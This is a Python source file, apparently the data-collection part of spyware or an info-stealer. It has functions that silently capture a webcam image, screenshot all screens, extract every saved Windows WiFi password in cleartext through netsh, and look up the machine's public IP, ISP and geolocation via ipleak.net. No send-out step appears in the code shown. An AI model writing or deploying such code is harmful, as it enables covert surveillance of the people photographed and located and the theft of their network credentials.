import cv2, subprocess, requests, json # type:ignore
from PIL import ImageGrab

def take_image(file_path: str) -> None:
    """
    Takes an image with the webcam.
    
    :param path (str): The path of the image file.
    """

    # Open the default camera (usually the first one)
    cap = cv2.VideoCapture(0)
    
    if not cap.isOpened():
        return
    
    # Capture a frame from the webcam
    ret, frame = cap.read()
    
    if not ret:
        cap.release()
        return
    
    # Release the camera
    cap.release()
    
    # Write the captured frame to a file
    cv2.imwrite(file_path, frame)

def capture(
        path: str,
        allScreens: bool = True,
        includeLayeredWindows: bool = False
) -> None:
    """
    Takes a screenshot of the current screen.
    
    :param path (str): Path of the image file.
    :param allScreens (bool): If True, captures all screens. Otherwise, captures the primary screen.
    :param includeLayeredWindows (bool): If True, captures windows that are layered.
    :return (None):
    """
    bbox = None
    xdisplay = None

    image = ImageGrab.grab(
        bbox=bbox,
        all_screens=allScreens,
        include_layered_windows=includeLayeredWindows,
        xdisplay=xdisplay
    )
    image.save(path)
    image.close()

def get_wifi_pwds() -> dict[str, str]:
    """
    Gets all saved WiFi passwords.
    
    :return (dict[str, str]): A dictionary with the WiFi names as keys and their passwords as values.
    """
    wifiPasswords: dict[str, str] = {}

    def _get_wifi_pwds(word1: str, word2: str) -> None:
        for profile in profiles:
            if word1 in profile:
                profileName = profile.split(":")[1].strip()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile "{profileName}" key=clear', shell=True).decode('cp850').split('\n')
                except subprocess.CalledProcessError:
                    continue

                for line in output:
                    if word2 in line:
                        password = line.split(":")[1].strip()
                        wifiPasswords[profileName] = password
                        break

    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode('cp850').split('\n')
    except:
        pass

    # Check with english and german output
    _get_wifi_pwds("All User Profile", "Key Content")
    _get_wifi_pwds("Profil für alle Benutzer", "Schlüsselinhalt")

    try:
        pwds: dict[str, str] = {}
        for profile, password in wifiPasswords.items():
            pwds[profile] = password
    except Exception:
        raise Exception("The passwords couldn't be formatted!")
    
    return pwds

def leak_all() -> dict[str, str]:
    """
    Gets the data from ipleak.net.
    
    :return (dict[str, str]): The following names as keys.

        as_number,
        isp_name,
        country_code,
        country,
        region_code,
        region_name,
        continent_code,
        continent_name,
        city_name,
        postal_code,
        postal_confidence,
        latitude,
        longitude,
        accuracy_radius,
        time_zone,
        metro_code,
        level,
        cache,
        ip,
        reverse,
        query_text,
        query_type,
        query_date
    """
    # Define the variables from ipleak
    r = requests.get('https://ipleak.net/json/')
    web_data: dict[str, str] = json.loads(r.text)  # Convert the text to JSON format

    data: dict[str, str] = {
        "as_number": web_data['as_number'],
        "isp_name": web_data['isp_name'],
        "country_code": web_data['country_code'],
        "country": web_data['country_name'],
        "region_code": web_data['region_code'],
        "region_name": web_data['region_name'],
        "continent_code": web_data['continent_code'],
        "continent_name": web_data['continent_name'],
        "city_name": web_data['city_name'],
        "postal_code": web_data['postal_code'],
        "postal_confidence": web_data['postal_confidence'],
        "latitude": web_data['latitude'],
        "longitude": web_data['longitude'],
        "accuracy_radius": web_data['accuracy_radius'],
        "time_zone": web_data['time_zone'],
        "metro_code": web_data['metro_code'],
        "level": web_data['level'],
        "cache": web_data['cache'],
        "ip": web_data['ip'],
        "reverse": web_data['reverse'],
        "query_text": web_data['query_text'],
        "query_type": web_data['query_type'],
        "query_date": web_data['query_date']
    }

    return data